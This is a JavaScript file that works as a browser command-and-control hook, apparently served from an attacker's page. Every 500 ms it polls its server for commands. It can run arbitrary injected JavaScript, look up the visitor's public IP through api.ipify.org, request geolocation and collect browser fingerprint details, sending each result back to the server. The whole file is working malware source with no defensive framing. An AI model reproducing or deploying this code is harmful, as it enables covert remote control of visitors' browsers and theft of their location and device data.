


console.log("Load OK!")

var loop;

function sendReturn(content) {
    var xhr = new XMLHttpRequest();
    xhr.open("GET","/?=shell_return "+content,true)
    xhr.send();
}
function showmap(position) {
    var cords = position.coords;
    var longitude = cords.longitude;
    var latitude = cords.latitude;

    console.log(longitude)
    console.log(latitude)
    sendReturn("[ longitude ] "+longitude+"\n;" + "[ latitude ] "+latitude);
}
function error(error) {
    var err = error.code;
    switch (err) {
        case 1: sendReturn("The user rejected location services"); break;
        case 2: sendReturn("Location information is not available"); break;
        case 3: sendReturn("Get information timed out");
    }
}
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showmap,error);
    } else {
        return "Get Location Error!";
    }
}
function getIP() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET","https://api.ipify.org/",false)
    xhr.send();
    return xhr.responseText.replace("\n","")
}

function exec(command) {
    command = command.replace("\n","")
    if (command.replace(" ","") === 'none') {
        return false;
    }
    if (command.startsWith("js: ")) {
        var javaScript = command.substring("js: ".length,command.length);

        var script = document.createElement("script");
        script.innerHTML = javaScript;
        document.body.appendChild(script);

        sendReturn("Run JavaScript ok: "+javaScript)
        return true;
    }
    if (command === 'getip') {
        var xhr = new XMLHttpRequest();
        xhr.open("GET","https://api.ipify.org/",true)
        xhr.send();
        xhr.onload = function (e) {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    sendReturn( "[IP] "+xhr.responseText);
                }
                else{
                    sendReturn( "[ ERROR ] GET IP ERROR!" );
                }
            }
        };
        return true;
    }
    if (command === 'getlocation')
    {
        getLocation();
        return true;
    }
    if (command === 'getinfo') {
        sendReturn("[ navigator ] /n" +
            "Platform: "+navigator.platform + "/n" +
            "UserAgent: " + navigator.userAgent + '/n' +
            "Language: " + navigator.language + "/n" +
            "Geolocation: " + navigator.geolocation + '/n' +
            "OnLine: " + navigator.onLine + "/n" +
            "AppName: "+navigator.appName + '/n' +
            "CookieEnabled: " + navigator.cookieEnabled
        );
        return true;
    }
    if (command === 'close') {
        clearInterval(loop)
        return true;
    }
    else {
        sendReturn("Command Error: "+command);
        return false;
    }
}

sendReturn("Connect: "+getIP());

loop = setInterval(function () {
    try{
        var xhr = new XMLHttpRequest();
        xhr.open("GET","/?=shell_api",true)
        xhr.send();

        xhr.onload = function (e) {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    //console.log(xhr.responseText)
                    exec(xhr.responseText);
                }
                else{
                    clearInterval(loop);
                }
            }
        };
    }catch (e){
        clearInterval(loop);
    }
} , 500)